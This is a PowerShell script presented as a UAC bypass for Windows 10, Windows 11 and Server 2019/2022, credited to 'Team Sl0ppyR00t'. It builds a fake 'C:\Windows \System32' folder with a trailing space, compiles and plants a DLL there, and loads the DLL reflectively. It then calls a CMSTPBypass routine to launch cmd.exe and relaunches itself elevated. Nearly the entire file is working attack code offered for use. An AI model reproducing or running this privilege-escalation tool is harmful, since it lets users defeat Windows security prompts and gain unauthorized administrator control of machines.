#!-.ps1 
#
# Author : P.Hoogeveem
#
# The main .ps1 file been re-dev by dev: @keytrap-x86 
#
# Aka    : x0xr00t
# Build  : 20210809
# Name   : UAC Bypass Win Server 2019| Win Server 2022 | Win 10 | Win 11
# Impact : Privesc 
# Method : DllReflection
# 
# Usage  : run the .ps1 file. 

write-Host ""
write-Host ""
write-Host ""
Write-Host " 000000000000000000000000000000000000000000"
Write-Host " 0 Sl0ppyR00t Gonna Check the os version. 0"
write-Host " 0      We do the UAC based on the os     0" 
Write-Host " 0     So that u dont need to check it.   0"
write-Host " 0            Team Sl0ppyRoot             0"
write-Host " 0               ~x0xr00t~                0"
Write-Host " 000000000000000000000000000000000000000000"
write-Host ""
write-Host ""
$user = $(cmd.exe /c echo %username%)
# OS-Check
$OSVersion = (get-itemproperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion" -Name ProductName).ProductName

$supportedVersions = @(
        "Windows 10 Home"
        "Windows 10 Pro"
        "Windows 10 Education"
        "Windows 10 Enterprise"
        "Windows 10 Enterprise 2015"
        "Windows 10 Mobile and Mobile Enterprise"
        "Windows 10 IoT Core"
        "Windows 10 IoT Enterprise LTSC 2021"
        "Windows 10 IoT Mobile Enterprise"
        "Windows Server 2019 Standard"
        "Windows Server 2019 Datacenter"
        "Windows Server 2019 Essentials"
        "Windows Server 2019 Azure Core"
        "Windows Server 2022 Standard"
        "Windows Server 2022 Datacenter"
        "Windows Server 2022 Azure Core"
        "Windows 11 Home"
        "Windows 11 Pro"
        "Windows 11 Education"
        "Windows 11 Enterprise"
        "Windows 11 IoT Enterprise"
        "Windows 11 IoT Mobile Enterprise"
        "Windows 11 Team"
        "Windows 11 Enterprise Multi-session"
);

if ($supportedVersions -notcontains $OSVersion) {
        Write-Host "Unsupported OS version: $OSVersion"
        Write-Host "Exiting..."
        exit
}
else {
        Write-Host " 0000000000000000000000000000000000000000000"
        Write-Host " 0 Sl0ppyR00t says it's a $OSVersion! 0"
        Write-Host " 0000000000000000000000000000000000000000000"
        Write-Host ""
        Write-Host ""
}




Write-Host " 00000000000000000000000000000000000000"
Write-Host " 0 Sl0ppyR00t Making Mock Folder..... 0"
Write-Host " 00000000000000000000000000000000000000"
New-Item "\\?\C:\Windows \System32" -ItemType Directory	
Write-Host ""
Write-Host ""
Write-Host " {Sl0ppyr00t} Making Mock Folder of system32 is done."
Write-Host ""
Write-Host ""
Write-Host " 00000000000000000000000000000000000000"
Write-Host " 0 Sl0ppyR00t Making DLL Files ...... 0"
Write-Host " 00000000000000000000000000000000000000"
Add-Type -TypeDefinition ([IO.File]::ReadAllText("$pwd\sl0puacb.cs")) -ReferencedAssemblies "System.Windows.Forms" -OutputAssembly "sl0p.dll"
Add-Type -TypeDefinition ([IO.File]::ReadAllText("$pwd\sl0puacb.cs")) -ReferencedAssemblies "System.Windows.Forms" -OutputAssembly "C:\Windows \system32\sl0p.dll"
Write-Host ""
Write-Host ""
Write-Host " {Sl0ppyr00t} Making DLL files is done."
Write-Host ""
Write-Host ""
Write-Host " 00000000000000000000000000000000000000"
Write-Host " 0 Sl0ppyR00t Copy DLL Files to Mock  0"
Write-Host " 00000000000000000000000000000000000000"
Copy-Item "sl0p.dll" -Destination "C:\Windows \system32\"
Write-Host ""
Write-Host ""
Write-Host " {Sl0ppyr00t} Copy Dll to Mock Folder of system32 is done."
Write-Host ""
Write-Host ""
Write-Host " 0000000000000000000000000000000000000000"
Write-Host " 0 Sl0ppyR00t Verify Place of DLL Files 0"
Write-Host " 0000000000000000000000000000000000000000"
Get-ChildItem C:\Windows \sytem32\sl0p.dll
Write-Host ""
Write-Host ""
Write-Host " {Sl0ppyr00t} File Is there."
[Reflection.Assembly]::Load([IO.File]::ReadAllBytes("$pwd\sl0p.dll"))

[CMSTPBypass]::Execute("C:\Windows\System32\cmd.exe") 
$currentUser = New-Object Security.Principal.WindowsPrincipal $([Security.Principal.WindowsIdentity]::GetCurrent())
$testadmin = $currentUser.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
if ($testadmin -eq $false) {
        Start-Process powershell.exe -Verb RunAs -ArgumentList ('-noprofile -noexit -file "{0}" -elevated' -f ($myinvocation.MyCommand.Definition))
        exit $LASTEXITCODE
}

# Get the ID and security principal of the current user account
$myWindowsID = [System.Security.Principal.WindowsIdentity]::GetCurrent()
$myWindowsPrincipal = new-object System.Security.Principal.WindowsPrincipal($myWindowsID)
 
# Get the security principal for the Administrator role
$adminRole = [System.Security.Principal.WindowsBuiltInRole]::Administrator
 
# Check to see if we are currently running "as Administrator"
if ($myWindowsPrincipal.IsInRole($adminRole)) {
        # We are running "as Administrator" - so change the title and background color to indicate this
        $Host.UI.RawUI.WindowTitle = $myInvocation.MyCommand.Definition + "(Sl0ppyr00t=000==Elevated==0000)"
        $host.UI.RawUI.BackgroundColor = “DarkRed”
        clear-host
}
else {
        # We are not running "as Administrator" - so relaunch as administrator
 
        # Create a new process object that starts PowerShell
        $newProcess = new-object System.Diagnostics.ProcessStartInfo "PowerShell";
 
        # Specify the current script path and name as a parameter
        $newProcess.Arguments = $myInvocation.MyCommand.Definition;
 
        # Indicate that the process should be elevated
        $newProcess.Verb = "runas";
 
        # Start the new process
        [System.Diagnostics.Process]::Start($newProcess);
 
        # Exit from the current, unelevated, process
        exit
}

# Get the ID and security principal of the current user account
$myWindowsID = [System.Security.Principal.WindowsIdentity]::GetCurrent()
$myWindowsPrincipal = new-object System.Security.Principal.WindowsPrincipal($myWindowsID)
 
# Get the security principal for the Administrator role
$adminRole = [System.Security.Principal.WindowsBuiltInRole]::Administrator
 
# Check to see if we are currently running "as Administrator"
if ($myWindowsPrincipal.IsInRole($adminRole)) {
        # We are running "as Administrator" - so change the title and background color to indicate this
        $Host.UI.RawUI.WindowTitle = $myInvocation.MyCommand.Definition + "(Sl0ppyr00t=000==Elevated==0000)"
        $Host.UI.RawUI.BackgroundColor = "DarkRed"
        clear-host
}
else {
        # We are not running "as Administrator" - so relaunch as administrator
 
        # Create a new process object that starts PowerShell
        $newProcess = new-object System.Diagnostics.ProcessStartInfo "PowerShell";
 
        # Specify the current script path and name as a parameter
        $newProcess.Arguments = $myInvocation.MyCommand.Definition;
 
        # Indicate that the process should be elevated
        $newProcess.Verb = "runas";
 
        # Start the new process
        [System.Diagnostics.Process]::Start($newProcess);
 
        # Exit from the current, unelevated, process
        exit
}
